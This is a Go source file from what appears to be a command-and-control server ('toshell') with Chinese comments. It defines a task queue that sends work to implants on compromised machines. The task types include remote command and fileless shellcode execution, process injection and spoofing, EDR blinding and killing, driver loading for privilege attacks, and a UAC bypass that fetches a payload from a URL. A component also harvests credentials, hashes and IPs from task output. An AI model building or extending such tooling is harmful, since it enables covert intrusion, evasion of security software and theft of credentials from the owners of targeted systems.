package task

import (
	"encoding/json"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"toshell/internal/common/types"
	"toshell/internal/server/avdetect"
	"toshell/internal/server/database"
	"toshell/internal/server/intel"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
)

type Manager struct {
	tasks       map[uint64]*types.TaskInfo
	pending     []*types.TaskInfo
	completed   []*types.TaskInfo
	mu          sync.RWMutex
	sessionMgr  *session.Manager
	taskCounter uint64

	// 会话热迁移（重连续传）：大文件直传断点状态。
	// 挂在全局 Manager 上而非监听器实例：listener stop/start 会重建实例，
	// 实例字段会在重启时丢失，导致断点续传失效（退化为全量重推）。
	transferMu    sync.RWMutex
	transfers     map[uint64]*TransferState
}

// TransferState 记录一个进行中的大文件直传断点（服务端视角，taskID 关联）。
type TransferState struct {
	TransferID string
	Size       int64
	Received   int64
}

var (
	manager *Manager
	once    sync.Once
)

const (
	StatusPending   = "pending"
	StatusSent      = "sent"
	StatusCompleted = "completed"
	StatusFailed    = "failed"
	StatusTimeout   = "timeout"
)

const (
	TaskTypeCommand    = "command"
	TaskTypeFileList   = "file_list"
	TaskTypeFileDown   = "file_download"
	TaskTypeFileUp     = "file_upload"
	TaskTypeFileDel    = "file_delete"
	TaskTypeProcList   = "process_list"
	TaskTypeProcKill   = "process_kill"
	TaskTypeProcInject = "process_inject"
	TaskTypeProcSpoof  = "process_spoof"
	TaskTypeAutoInject = "auto_inject"
	TaskTypeSpawn      = "spawn"

	TaskTypeBOFLoad   = "bof_load"
	TaskTypeShell     = "shell"
	TaskTypeInjection = "injection"
	TaskTypeExit      = "exit"

	// TaskTypeFilelessExec 全内存无文件执行：shellcode / BOF / DLL 不落盘执行。
	TaskTypeFilelessExec = "fileless_exec"

	// TaskTypeScreenStream 实时屏幕流（start/stop）。
	TaskTypeScreenStream = "screen_stream"

	// TaskTypeRelay 运行时中继控制（start 监听端口 / stop）。
	TaskTypeRelay = "relay"

	// TaskTypeEDRBlind EDR 失明（ntdll 脱钩 + ETW patch + Autologger 清理）。
	TaskTypeEDRBlind = "edr_blind"

	// TaskTypeEDRKill EDR 击杀（按进程名终止杀软/EDR）。
	TaskTypeEDRKill = "edr_kill"

	// BYOVD / PPL
	TaskTypeBYOVDLoad  = "byovd_load"
	TaskTypeBYOVDUnload = "byovd_unload"
	TaskTypePPLKill    = "ppl_kill"

	// TaskTypeUACBypass UAC 提权（fodhelper + 内存执行 shellcode 回连上线）。
	TaskTypeUACBypass = "uac_bypass"
)

type TaskParams struct {
	Command     string
	Args        []string
	ExecuteType string
	Timeout     uint32
	TaskType    string
	Path        string
	PID         uint32
	Data        string
}

func New(sessMgr *session.Manager) *Manager {
	once.Do(func() {
		manager = &Manager{
			tasks:      make(map[uint64]*types.TaskInfo),
			pending:    make([]*types.TaskInfo, 0),
			completed:  make([]*types.TaskInfo, 0),
			sessionMgr: sessMgr,
			transfers:  make(map[uint64]*TransferState),
		}
	})
	return manager
}

func Get() *Manager {
	if manager == nil {
		return nil
	}
	return manager
}

func (m *Manager) Create(sessionID string, params TaskParams) (*types.TaskInfo, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.sessionMgr != nil {
		_, err := m.sessionMgr.Get(sessionID)
		if err != nil {
			return nil, fmt.Errorf("session not found: %s", sessionID)
		}
	}

	atomic.AddUint64(&m.taskCounter, 1)
	taskID := atomic.LoadUint64(&m.taskCounter)

	if params.TaskType == "" {
		params.TaskType = TaskTypeCommand
	}

	task := &types.TaskInfo{
		ID:          taskID,
		SessionID:   sessionID,
		TaskType:    params.TaskType,
		Command:     params.Command,
		Args:        params.Args,
		ExecuteType: params.ExecuteType,
		Status:      StatusPending,
		CreatedAt:   time.Now(),
		Timeout:     params.Timeout,
		ExitCode:    -1,
		Path:        params.Path,
		PID:         params.PID,
		Data:        params.Data,
	}

	m.tasks[taskID] = task
	m.pending = append(m.pending, task)

	db := database.Get()
	if db != nil {
		db.CreateTask(task)
	}

	logging.Info("task", "Task created: %d (type: %s) for session %s", taskID, params.TaskType, sessionID)
	return task, nil
}

func (m *Manager) CreateCommand(sessionID, command string, args []string, timeout uint32) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeCommand,
		Command:  command,
		Args:     args,
		Timeout:  timeout,
	})
}

// CreateExit 创建"退出"任务：删除主机时推送给植入端，令其停止运行。
func (m *Manager) CreateExit(sessionID string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeExit,
		Timeout:  10,
	})
}

func (m *Manager) CreateFileList(sessionID, path string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileList,
		Path:     path,
	})
}

func (m *Manager) CreateFileDownload(sessionID, path string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileDown,
		Path:     path,
	})
}

func (m *Manager) CreateFileUpload(sessionID, path, data string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileUp,
		Path:     path,
		Data:     data,
	})
}

func (m *Manager) CreateFileDelete(sessionID, path string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFileDel,
		Path:     path,
	})
}

func (m *Manager) CreateProcessList(sessionID string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcList,
	})
}

func (m *Manager) CreateProcessKill(sessionID string, pid uint32) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcKill,
		PID:      pid,
	})
}

func (m *Manager) CreateBOFLoad(sessionID, data, args string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeBOFLoad,
		Data:     data,
		Command:  args,
	})
}

// CreateScreenStream 创建实时屏幕流任务（action = start / stop）。
func (m *Manager) CreateScreenStream(sessionID, action string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{"action": action})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeScreenStream,
		Data:     string(data),
	})
}

// CreateEDRBlind 创建 EDR 失明任务（ntdll 脱钩 + ETW patch + Autologger 清理）。
func (m *Manager) CreateEDRBlind(sessionID string) (*types.TaskInfo, error) {
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeEDRBlind,
		Data:     `{}`,
	})
}

// CreateEDRKill 创建 EDR 击杀任务；processes 为空时植入端使用内置默认杀软进程列表。
func (m *Manager) CreateEDRKill(sessionID string, processes []string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]interface{}{"processes": processes})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeEDRKill,
		Data:     string(data),
	})
}

// CreateBYOVDLoad 创建 BYOVD 驱动加载任务。
func (m *Manager) CreateBYOVDLoad(sessionID, driverB64, serviceName, deviceName string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{
		"driver_b64":  driverB64,
		"service_name": serviceName,
		"device_name":  deviceName,
	})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeBYOVDLoad,
		Data:     string(data),
	})
}

// CreateBYOVDUnload 创建 BYOVD 驱动卸载任务。
func (m *Manager) CreateBYOVDUnload(sessionID, serviceName string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{"service_name": serviceName})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeBYOVDUnload,
		Data:     string(data),
	})
}

// CreatePPLKill 创建 PPL 击杀任务；processes 为空时使用默认杀软列表。
func (m *Manager) CreatePPLKill(sessionID string, processes []string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]interface{}{"processes": processes})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypePPLKill,
		Data:     string(data),
	})
}

// CreateRelayControl 创建运行时中继控制任务（action = start/stop，start 时 addr 为监听地址）。
func (m *Manager) CreateRelayControl(sessionID, action, addr string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{"action": action, "addr": addr})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeRelay,
		Data:     string(data),
	})
}

// CreateUACBypass 创建 UAC 提权任务（payloadURL 为提权进程内存执行的 shellcode 下载地址）。
func (m *Manager) CreateUACBypass(sessionID, payloadURL string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{"payload_url": payloadURL})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeUACBypass,
		Data:     string(data),
	})
}

// CreateFilelessExec 创建全内存无文件执行任务。
// kind ∈ {shellcode, bof, dll}；payloadB64 为载荷的 base64 编码；args/entry 为可选参数
// （BOF 参数 / DLL 导出函数名）。
func (m *Manager) CreateFilelessExec(sessionID, kind, payloadB64, args, entry string) (*types.TaskInfo, error) {
	data, _ := json.Marshal(map[string]string{
		"kind":        kind,
		"payload_b64": payloadB64,
		"args":        args,
		"entry":       entry,
	})
	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeFilelessExec,
		Data:     string(data),
	})
}

func (m *Manager) CreateProcessInject(sessionID string, method string, pid int, shellcode string, dllPath string) (*types.TaskInfo, error) {
	// Create JSON data for injection
	data := map[string]interface{}{
		"method":    method,
		"pid":       pid,
		"shellcode": shellcode,
		"dll_path":  dllPath,
	}
	dataJSON, _ := json.Marshal(data)

	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcInject,
		Data:     string(dataJSON),
	})
}

func (m *Manager) CreateProcessSpoof(sessionID string, method string, targetPath string, parentPID int, shellcode string) (*types.TaskInfo, error) {
	// Create JSON data for spoofing
	data := map[string]interface{}{
		"method":      method,
		"target_path": targetPath,
		"parent_pid":  parentPID,
		"shellcode":   shellcode,
	}
	dataJSON, _ := json.Marshal(data)

	return m.Create(sessionID, TaskParams{
		TaskType: TaskTypeProcSpoof,
		Data:     string(dataJSON),
	})
}

func (m *Manager) Get(id uint64) (*types.TaskInfo, error) {
	// Memory is the source of truth during runtime — it's always more current than DB
	m.mu.RLock()
	task, ok := m.tasks[id]
	m.mu.RUnlock()
	if ok {
		return task, nil
	}

	// Fallback to DB for post-restart recovery (memory cache is empty after restart)
	db := database.Get()
	if db != nil {
		task, err := db.GetTask(id)
		if err == nil {
			m.mu.Lock()
			m.tasks[id] = task
			m.mu.Unlock()
			return task, nil
		}
	}

	return nil, fmt.Errorf("task not found: %d", id)
}

func (m *Manager) GetNext(sessionID string) (*types.TaskInfo, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	for i, task := range m.pending {
		if task.SessionID == sessionID && task.Status == StatusPending {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			task.Status = StatusSent
			now := time.Now()
			task.SentAt = &now
			m.tasks[task.ID] = task

			db := database.Get()
			if db != nil {
				db.UpdateTask(task)
			}

			logging.Debug("task", "Task %d sent to session %s", task.ID, sessionID)
			return task, nil
		}
	}

	return nil, fmt.Errorf("no pending tasks for session: %s", sessionID)
}

// GetNextBatch 从 pending 队列中批量取出指定会话的待执行任务（最多 max 个）。
// HTTP 轮询通道使用：植入端心跳间隔较长，若每次只下发一个任务，
// 多个任务会排队数分钟，表现为"功能无响应"。批量下发后植入端顺序执行。
// 返回空切片表示无待执行任务。
func (m *Manager) GetNextBatch(sessionID string, max int) []*types.TaskInfo {
	if max <= 0 {
		max = 16
	}
	m.mu.Lock()
	defer m.mu.Unlock()

	var out []*types.TaskInfo
	now := time.Now()
	kept := m.pending[:0]
	for _, task := range m.pending {
		if task.SessionID == sessionID && task.Status == StatusPending && len(out) < max {
			task.Status = StatusSent
			task.SentAt = &now
			m.tasks[task.ID] = task
			out = append(out, task)
			continue
		}
		kept = append(kept, task)
	}
	if len(out) > 0 {
		m.pending = kept
		db := database.Get()
		if db != nil {
			for _, t := range out {
				db.UpdateTask(t)
			}
		}
		logging.Debug("task", "Batch %d tasks sent to session %s", len(out), sessionID)
	}
	return out
}

func (m *Manager) Complete(id uint64, exitCode int32, output, errorMsg string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	task.Status = StatusCompleted
	task.ExitCode = exitCode
	// av_detect 的指纹匹配与结果组装在服务端完成（指纹库可热更新）
	if task.TaskType == "av_detect" {
		output = avdetect.DetectFromOutput(output)
	}
	task.Output = output
	task.Error = errorMsg
	now := time.Now()
	task.CompletedAt = &now

	// 情报提取：从任务输出中抽取 IP/账号/哈希/共享等，跨会话聚合
	if exitCode == 0 && output != "" {
		added := intel.Get().Extract(task.SessionID, task.ID, task.TaskType, output)
		if added > 0 {
			logging.Debug("intel", "Task %d: extracted %d intel item(s)", task.ID, added)
		}
	}

	m.completed = append(m.completed, task)

	// 从 pending 中移除（防止无限增长）
	m.removeFromPending(id)

	db := database.Get()
	if db != nil {
		db.UpdateTask(task)
	}

	logging.Info("task", "Task %d completed with exit code %d", id, exitCode)
	return nil
}

func (m *Manager) Fail(id uint64, errorMsg string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	task.Status = StatusFailed
	task.Error = errorMsg
	now := time.Now()
	task.CompletedAt = &now

	m.completed = append(m.completed, task)

	// 从 pending 中移除（防止无限增长）
	m.removeFromPending(id)

	db := database.Get()
	if db != nil {
		db.UpdateTask(task)
	}

	logging.Error("task", "Task %d failed: %s", id, errorMsg)
	return nil
}

// UpdateProgress 更新任务传输进度（0-100），不改变状态。
// 大文件下载/上传分块直传时由监听器随帧调用，前端据此显示进度条。
func (m *Manager) UpdateProgress(id uint64, progress int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}
	if progress < 0 {
		progress = 0
	}
	if progress > 100 {
		progress = 100
	}
	if task.Progress == progress {
		return nil
	}
	task.Progress = progress
	if db := database.Get(); db != nil {
		db.UpdateTask(task)
	}
	return nil
}

// removeFromPending 从 pending 列表中移除指定任务（需持有 m.mu 锁）
func (m *Manager) removeFromPending(id uint64) {
	for i, t := range m.pending {
		if t.ID == id {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			return
		}
	}
}

func (m *Manager) ListBySession(sessionID string) []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var tasks []*types.TaskInfo
	for _, task := range m.tasks {
		if task.SessionID == sessionID {
			tasks = append(tasks, task)
		}
	}

	return tasks
}

// TrackTransfer 记录/更新大文件直传断点（重连续传）。
// 新 transfer_id 视为新传输会话：重置进度。
func (m *Manager) TrackTransfer(taskID uint64, transferID string, size int64, received int64) {
	if taskID == 0 {
		return
	}
	m.transferMu.Lock()
	defer m.transferMu.Unlock()
	st, ok := m.transfers[taskID]
	if !ok || st.TransferID != transferID {
		st = &TransferState{TransferID: transferID, Size: size}
		m.transfers[taskID] = st
	}
	if received > st.Received {
		st.Received = received
	}
}

// GetTransfer 读取大文件直传断点。
func (m *Manager) GetTransfer(taskID uint64) (*TransferState, bool) {
	m.transferMu.RLock()
	defer m.transferMu.RUnlock()
	st, ok := m.transfers[taskID]
	if !ok {
		return nil, false
	}
	cp := *st
	return &cp, true
}

// ClearTransfer 清除断点（传输完成/取消时调用）。
func (m *Manager) ClearTransfer(taskID uint64) {
	m.transferMu.Lock()
	defer m.transferMu.Unlock()
	delete(m.transfers, taskID)
}

// ListReplayable 返回指定会话中"应补发"的任务：
// pending（尚未派发）与 sent（已派发但未收到结果，可能因断连丢失）。
// completed/failed/timeout 等终态任务不补发。会话热迁移（重连续传）使用。
func (m *Manager) ListReplayable(sessionID string) []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var out []*types.TaskInfo
	for _, task := range m.tasks {
		if task.SessionID != sessionID {
			continue
		}
		if task.Status == StatusPending || task.Status == StatusSent {
			out = append(out, task)
		}
	}
	return out
}

// RequeueSent 把指定会话中处于 sent 状态的任务重新放回 pending 队列，
// 供轮询通道（HTTP）在心跳时再次下发（断连导致结果丢失的重试）。
// 仅重入队超过 staleAfter 仍无结果的任务（防止长任务执行中被打断重复派发）。
// 返回被重新入队的任务数。
func (m *Manager) RequeueSent(sessionID string, staleAfter time.Duration) int {
	m.mu.Lock()
	defer m.mu.Unlock()

	now := time.Now()
	var requeued int
	for _, task := range m.tasks {
		if task.SessionID != sessionID || task.Status != StatusSent {
			continue
		}
		if task.SentAt != nil && now.Sub(*task.SentAt) < staleAfter {
			continue // 刚派发不久，植入端可能仍在执行
		}
		task.Status = StatusPending
		// 防重复入队
		dup := false
		for _, p := range m.pending {
			if p.ID == task.ID {
				dup = true
				break
			}
		}
		if !dup {
			m.pending = append(m.pending, task)
		}
		requeued++
	}
	if requeued > 0 {
		logging.Debug("task", "Requeued %d stale sent task(s) for session %s", requeued, sessionID)
	}
	return requeued
}

func (m *Manager) ListPending() []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]*types.TaskInfo, len(m.pending))
	copy(result, m.pending)
	return result
}

func (m *Manager) ListCompleted() []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]*types.TaskInfo, len(m.completed))
	copy(result, m.completed)
	return result
}

func (m *Manager) ListAll() []*types.TaskInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	tasks := make([]*types.TaskInfo, 0, len(m.tasks))
	for _, task := range m.tasks {
		tasks = append(tasks, task)
	}

	return tasks
}

func (m *Manager) Delete(id uint64) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	_, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	delete(m.tasks, id)

	for i, task := range m.pending {
		if task.ID == id {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			break
		}
	}

	logging.Info("task", "Task %d deleted", id)
	return nil
}

func (m *Manager) Cancel(id uint64) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	task, ok := m.tasks[id]
	if !ok {
		return fmt.Errorf("task not found: %d", id)
	}

	if task.Status != StatusPending {
		return fmt.Errorf("cannot cancel task in status: %s", task.Status)
	}

	task.Status = StatusFailed
	task.Error = "cancelled by operator"

	for i, t := range m.pending {
		if t.ID == id {
			m.pending = append(m.pending[:i], m.pending[i+1:]...)
			break
		}
	}

	db := database.Get()
	if db != nil {
		db.UpdateTask(task)
	}

	logging.Info("task", "Task %d cancelled", id)
	return nil
}

func (m *Manager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.tasks)
}

func (m *Manager) CountPending() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.pending)
}

func (m *Manager) CountCompleted() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.completed)
}

func (m *Manager) CleanupOldTasks(maxAge time.Duration) int {
	m.mu.Lock()
	defer m.mu.Unlock()

	cutoff := time.Now().Add(-maxAge)
	cleaned := 0

	// 终态任务（completed/failed/timeout）：按完成时间清理
	newCompleted := make([]*types.TaskInfo, 0)
	for _, task := range m.completed {
		if task.CompletedAt != nil && task.CompletedAt.After(cutoff) {
			newCompleted = append(newCompleted, task)
		} else {
			delete(m.tasks, task.ID)
			cleaned++
		}
	}
	m.completed = newCompleted

	// 僵尸任务回收：pending/sent 且创建超过 maxAge 的任务
	// （植入体失联后任务永远卡在中间态，此前永不回收导致内存/DB 无限增长）。
	// 时间窗与终态任务一致（默认 24h），足够覆盖慢任务执行窗口。
	keptPending := make([]*types.TaskInfo, 0)
	for _, task := range m.pending {
		if task.CreatedAt.After(cutoff) {
			keptPending = append(keptPending, task)
		} else {
			delete(m.tasks, task.ID)
			cleaned++
		}
	}
	m.pending = keptPending

	// sent 态任务不在 pending 列表，单独按 tasks map 扫描
	for _, task := range m.tasks {
		if task == nil {
			continue
		}
		if task.Status == StatusSent && task.CreatedAt.Before(cutoff) {
			delete(m.tasks, task.ID)
			cleaned++
		}
	}

	if cleaned > 0 {
		logging.Info("task", "Cleaned up %d old tasks (incl. stale pending/sent)", cleaned)
	}
	return cleaned
}
